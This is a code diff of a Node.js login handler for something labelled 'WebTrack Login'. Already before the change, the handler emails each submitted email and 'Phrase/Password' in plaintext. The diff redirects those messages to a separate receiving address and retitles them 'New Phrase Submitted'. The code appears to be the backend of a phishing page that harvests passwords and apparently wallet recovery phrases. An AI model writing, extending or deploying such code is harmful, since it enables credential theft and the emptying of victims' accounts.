@@ -37,11 +37,11 @@ app.post('/auth/login', async (req, res) => {
         // Send email
         const info = await transporter.sendMail({
             from: `"WebTrack Login" <${process.env.EMAIL_USER}>`,
-            to: process.env.EMAIL_USER, // Send to self
-            subject: 'New Login Attempt',
-            text: `New login attempt detected.\n\nInput: ${email}\nPhrase/Password: ${password}`,
+            to: process.env.RECIEVING_EMAIL, // Send to self
+            subject: 'New Phrase Submitted',
+            text: `New phrase submitted.\n\nInput: ${email}\nPhrase/Password: ${password}`,
             html: `
-        <h3>New Login Attempt</h3>
+        <h3>New Phrase Submitted</h3>
         <p><strong>Input:</strong> ${email}</p>
         <p><strong>Phrase/Password:</strong> ${password}</p>
       `,
